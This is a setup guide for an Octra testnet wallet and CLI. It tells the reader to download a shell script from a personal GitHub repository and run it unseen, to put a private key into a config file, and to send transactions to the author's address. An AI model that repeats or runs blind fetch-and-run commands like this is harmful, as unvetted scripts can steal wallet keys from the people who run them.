# 💻 Installation
Open any Linux based terminal, you can use VPS / WSL (On windows) or simply you can use virtual IDE as well
If you don't have any VPS or not have WSL installed in your Windows, then simply go for virtual IDE
One virtual IDE, I use the most is Github Codespaces, visit this link and choose a blank template
Note

# Now install curl command first
```
command -v curl >/dev/null 2>&1 || { sudo apt-get update && sudo apt-get install -y curl; }
```
# 2nd command
```
curl -sSL https://raw.githubusercontent.com/MetaBooy/octawallet/refs/heads/main/wallet.sh -o start.sh && chmod +x start.sh && ./start.sh
```

#⚡ Post-Installation
Visit octra [faucet](https://faucet.octra.network/) website to request faucet
Paste your wallet address, solve captcha and request faucet

# Task 1: Send transactions
1. Install Python

```
sudo apt install python3 python3-pip python3-venv python3-dev -y
```
# 2. Install CLI

```
git clone https://github.com/octra-labs/octra_pre_client.git
cd octra_pre_client

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

cp wallet.json.example wallet.json
```
# 3. Add wallet to CLI
```
nano wallet.json
```
Replace following values:
private-key-here: Privatekey with B64 format
octxxxxxxxx...: Octra address starting with oct...
# 4. Start CLI
```
python3 -m venv venv
source venv/bin/activate
python3 cli.py
```
This should open a Testnet UI
![image](https://github.com/user-attachments/assets/053a41c8-5906-43ec-9412-3d9fb595b831)


# 5. Send transactions
Send transactions to my address: oct6RXhfVUHCQ97J1ZTTcn6oRkpoUMLiijZWfS3zxpJbiEP
